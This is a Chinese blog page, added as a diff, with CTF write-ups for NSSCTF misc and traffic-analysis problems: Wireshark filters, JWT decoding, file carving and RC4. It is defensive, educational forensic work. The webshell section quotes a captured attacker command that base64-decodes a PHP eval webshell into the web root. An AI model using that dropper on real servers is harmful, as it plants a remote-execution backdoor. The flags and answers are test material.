@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xuan tu">
+
+
+
+
+
+
+
+<title>NSSCTF题库解决流程 | 曲径通幽处.</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            ヾ(^_^) back Home.!!
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">主页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">文章</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1a-OiD9e0tEgNmWDoR0RGkhBtp-v8TQq8?usp=drive_link">图书馆(M)</a>
+              </li> 
+                   
+          
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
+        </div>
+        <div class="post-title">
+            
+            
+                NSSCTF题库解决流程
+            
+            
+        </div>
+        <span class="post-date">
+            8月 6, 2023
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <p>NSSCTF题库</p>
+<h1 id="陇剑杯-2021-签到"><a href="#陇剑杯-2021-签到" class="headerlink" title="[陇剑杯 2021]签到"></a>[陇剑杯 2021]签到</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：wireshark</span><br><span class="line">附件：Good.pcapng</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>总结：IPv4不属于HTTP协议。IPv4是Internet Protocol的第四版，是Internet上最常用的协议。HTTP是HyperText Transfer Protocol的缩写，是Internet上用于传输超文本数据的协议。HTTP是应用层协议，而IPv4是网络层协议。网络层协议负责在两个计算机之间传输数据包，而应用层协议负责在两个应用程序之间传输数据。因此，HTTP协议需要依赖IPv4协议才能在Internet上传输数据。</p>
+<p>wp:</p>
+<p>Wireshark打开流量包，选择统计选项，对协议进行分级统计，发现流量包主要是TCP协议，且应用层的协议主要是HTTP，因此判断是HTTP协议的攻击。</p>
+<h1 id="长城杯-2021-院校组-签到"><a href="#长城杯-2021-院校组-签到" class="headerlink" title="[长城杯 2021 院校组]签到"></a>[长城杯 2021 院校组]签到</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：随波逐流ctf工具</span><br><span class="line">附件：一串16进制字符串</span><br></pre></td></tr></table></figure>
+
+<p>16转ascii</p>
+<p>ascii解base64</p>
+<h1 id="陇剑杯-2021-jwt（问1）"><a href="#陇剑杯-2021-jwt（问1）" class="headerlink" title="[陇剑杯 2021]jwt（问1）"></a>[陇剑杯 2021]jwt（问1）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：wireshark</span><br><span class="line">附件： goroot.pcap</span><br></pre></td></tr></table></figure>
+
+<p>如何分析是否存在认证协议：</p>
+<p>例子：若要查看该流量包中是否包含Basic Auth认证协议，请查看流量包详细信息中的HTTP字段，并找到“Authorization”头，看它的值是否包含”Basic”关键词。</p>
+<h1 id="陇剑杯-2021-webshell（问1）"><a href="#陇剑杯-2021-webshell（问1）" class="headerlink" title="[陇剑杯 2021]webshell（问1）"></a>[陇剑杯 2021]webshell（问1）</h1><p>category: misk<br>tools：wireshark<br>附件： .pcap</p>
+<p>在上方应用显示过滤器输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p>用来过滤，只显示post请求</p>
+<p><img src="C:\Users\34476\AppData\Roaming\Typora\typora-user-images\image-20230806204750590.png" alt="image-20230806204750590"></p>
+<p>登陆操作为login，找到info带login的一栏，点进去，发现password字段就是黑客使用的密码</p>
+<h1 id="SWPU-2019-神奇的二维码"><a href="#SWPU-2019-神奇的二维码" class="headerlink" title="[SWPU 2019]神奇的二维码"></a>[SWPU 2019]神奇的二维码</h1><p>category: misk<br>tools：binwalk 、basecrack、audacity<br>附件： goroot.pcap</p>
+<p>利用工具：<img src="C:\Users\34476\AppData\Roaming\Typora\typora-user-images\image-20230806205828105.png" alt="image-20230806205828105"></p>
+<p>发现f提示lag不在这里，说明直接扫是不可以的</p>
+<p>放到010editor里面，CTRL+F 搜索flag，发现藏着flag.jpg和flag.doc还有一个“看看flag在不在里面.rar”</p>
+<p>可以把图片放到你的Linux电脑下，使用binwalk和dd命令（使用方法：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yuuki-/p/7868880.html%EF%BC%89">https://www.cnblogs.com/Yuuki-/p/7868880.html）</a></p>
+<p>binwalk用于分析文件结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">Binwalk MISC-神奇的二维码-BitcoinPay.png</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=MISC-神奇的二维码-BitcoinPay.png of=out.rar skip=具体位置 bs=1</span><br></pre></td></tr></table></figure>
+
+<p>然后得到了三个压缩包</p>
+<p>有一个base64界出来是“看看flag在不在里面^_^.rar”的解压密码</p>
+<p>flag.doc是一个base64套娃，利用basecrack一键解决：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python basecrack.py -f flag.txt --magic</span><br></pre></td></tr></table></figure>
+
+<p>得到最后一个压缩包的密码</p>
+<p>里面是good.mp3</p>
+<p>放到audacity里面看看，发现波形图是摩斯电码</p>
+<p>解出来即可</p>
+<h1 id="陇剑杯-2021-jwt（问3）"><a href="#陇剑杯-2021-jwt（问3）" class="headerlink" title="[陇剑杯 2021]jwt（问3）"></a>[陇剑杯 2021]jwt（问3）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：wireshark</span><br><span class="line">附件： goroot.pcap</span><br></pre></td></tr></table></figure>
+
+<p>在上方应用显示过滤器输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p>用来过滤，只显示post请求</p>
+<p>分析黑客行为，其使用了command来执行了whoami，并且输入了admin和账号密码，判断出来是获取了root权限</p>
+<p>NSSCTF{root}</p>
+<h1 id="陇剑杯-2021-jwt（问2）"><a href="#陇剑杯-2021-jwt（问2）" class="headerlink" title="[陇剑杯 2021]jwt（问2）"></a>[陇剑杯 2021]jwt（问2）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：wireshark、jwt.io</span><br><span class="line">附件： goroot.pcap</span><br></pre></td></tr></table></figure>
+
+<p>追踪http流，搜token，将其复制，放到jwt.io中解析即可</p>
+<h1 id="NISACTF-2022-huaji？"><a href="#NISACTF-2022-huaji？" class="headerlink" title="[NISACTF 2022]huaji？"></a>[NISACTF 2022]huaji？</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：binwalk 随波逐流编码工具</span><br><span class="line">附件： huaji?</span><br></pre></td></tr></table></figure>
+
+<p>用binwalk分析，果然藏着东西，然后用foremost分离：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost huaji? -T</span><br></pre></td></tr></table></figure>
+
+<p>得到了jpg图片和zip压缩包</p>
+<p>jpg放到010中没有有用信息</p>
+<p>查看属性得知有一个相机编号</p>
+<p>16转ascii得到压缩包密码</p>
+<p>解压得到flag</p>
+<h1 id="SWPU-2020-套娃"><a href="#SWPU-2020-套娃" class="headerlink" title="[SWPU 2020]套娃"></a>[SWPU 2020]套娃</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：010editor 随波逐流编码工具 https://www.sojson.com/encrypt_rc4.html</span><br><span class="line">附件： 套娃.xls</span><br></pre></td></tr></table></figure>
+
+<p>放010 中发现zip的文件头pk，改文件后缀为zip得到里面的文件，多次套娃</p>
+<p>里面的文件的名字提示我的，此题可能需要破解rc4加密算法</p>
+<p><strong>RC4 是一种流加密算法，这意味着它将密钥流与明文进行异或，以生成密文。</strong></p>
+<p>文件夹中的RC4data应该是密文</p>
+<p>其中一个文件夹中还有一个名为RC4key的文件，为密钥</p>
+<p>因此如果得知此密钥，即可解得明文</p>
+<p>把esayrc4.zip放到010里面，发现最后有一个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password:6e4c834d77cba03af41e1562a5bce84e</span><br></pre></td></tr></table></figure>
+
+<p>这个即为解压密码</p>
+<p>得到了RC4key：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br></pre></td></tr></table></figure>
+
+<p>又有RC4data：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX19uI2lzmxYrQ9mc16y7la7qc7VTS8gLaUKa49gzXPclxRXVsRJxWz/p</span><br></pre></td></tr></table></figure>
+
+<p>解出来这个东西：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ef1a73d40977a49b99b871980f355757</span><br></pre></td></tr></table></figure>
+
+<p>随波逐流编码工具跑了一下没什么特殊含义，直接提交看看</p>
+<p>flag正确</p>
+<h1 id="陇剑杯-2021-jwt（问5）"><a href="#陇剑杯-2021-jwt（问5）" class="headerlink" title="[陇剑杯 2021]jwt（问5）"></a>[陇剑杯 2021]jwt（问5）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：wireshark</span><br><span class="line">附件：goroot.pcap</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p>一个个查看，得知文件名为looter.so</p>
+<h1 id="陇剑杯-2021-jwt（问4）"><a href="#陇剑杯-2021-jwt（问4）" class="headerlink" title="[陇剑杯 2021]jwt（问4）"></a>[陇剑杯 2021]jwt（问4）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：wireshark</span><br><span class="line">附件：goroot.pcap</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p>一个个查看，得知文件名为1.c</p>
+<h1 id="陇剑杯-2021-jwt（问6）"><a href="#陇剑杯-2021-jwt（问6）" class="headerlink" title="[陇剑杯 2021]jwt（问6）"></a>[陇剑杯 2021]jwt（问6）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：wireshark</span><br><span class="line">附件：goroot.pcap</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p>一个个查看，得知绝对路径为：&#x2F;etc&#x2F;pam.d&#x2F;common-auth</p>
+<h1 id="陇剑杯-2021-webshell（问2）"><a href="#陇剑杯-2021-webshell（问2）" class="headerlink" title="[陇剑杯 2021]webshell（问2）"></a>[陇剑杯 2021]webshell（问2）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Form item: “tpl” &#x3D; “data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log”</p>
+<p>加上&#x2F;var&#x2F;www&#x2F;html&#x2F;：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/data/Runtime/Logs/Home/21_08_07.log</span><br></pre></td></tr></table></figure>
+
+<p>over~:）</p>
+<h1 id="陇剑杯-2021-webshell（问4）"><a href="#陇剑杯-2021-webshell（问4）" class="headerlink" title="[陇剑杯 2021]webshell（问4）"></a>[陇剑杯 2021]webshell（问4）</h1><p>发现值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Form item: &quot;aaa&quot; = &quot;system(&#x27;echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4=|base64 -d &gt; /var/www/html/1.php&#x27;);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>因此答案为：1.php</p>
+<h1 id="SWPUCTF-2021-新生赛-gif好像有点大"><a href="#SWPUCTF-2021-新生赛-gif好像有点大" class="headerlink" title="[SWPUCTF 2021 新生赛]gif好像有点大"></a>[SWPUCTF 2021 新生赛]gif好像有点大</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category: misk</span><br><span class="line">tools：ScreenToGif  https://online-barcode-reader.inliteresearch.com/</span><br><span class="line">附件：CTF.gif</span><br></pre></td></tr></table></figure>
+
+<p>把图片放到ScreenToGif中，逐帧查看，发现有一帧存在二维码，放到<a target="_blank" rel="noopener" href="https://online-barcode-reader.inliteresearch.com/%E6%89%AB%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%BE%97%E5%88%B0flag">https://online-barcode-reader.inliteresearch.com/扫一下，得到flag</a></p>
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2023/08/07/wsl%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">Prev</a>
+                </div>
+            
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2023/08/04/pwn%E5%85%A5%E9%97%A8/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+     
+
+     
+
+
+    
+       <!--PC版-->
+        <div id="SOHUCS" ></div>
+        <script charset="utf-8" type="text/javascript" src="https://cy-cdn.kuaizhan.com/upload/changyan.js" ></script>
+        <script type="text/javascript">
+        window.changyan.api.config({
+            appid: 'cywJvGKKO',
+            conf: 'prod_dfd0ec91693832034dcc62943592b045'
+        });
+        </script>   
+     
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                
+                <br>
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+    
+
+  </body>
+</html>
